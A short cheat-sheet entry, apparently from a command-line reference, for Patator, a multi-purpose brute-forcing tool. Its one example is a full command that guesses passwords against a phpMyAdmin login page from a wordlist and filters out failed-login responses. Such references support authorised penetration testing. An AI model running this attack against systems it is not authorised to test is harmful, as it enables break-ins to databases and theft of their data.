# Patator

> Multi-purpose brute-forcer
> More information: <https://en.kali.tools/?p=147>

- Brute-force a phpMyadmin page:

`patator http_fuzz url={{host_ip}}/phpmyadmin/index.php method=POST body='pma_username={{user}}&pma_password=FILE0&server=1&lang=en' 0={{/path/to/wordlist}} follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'`
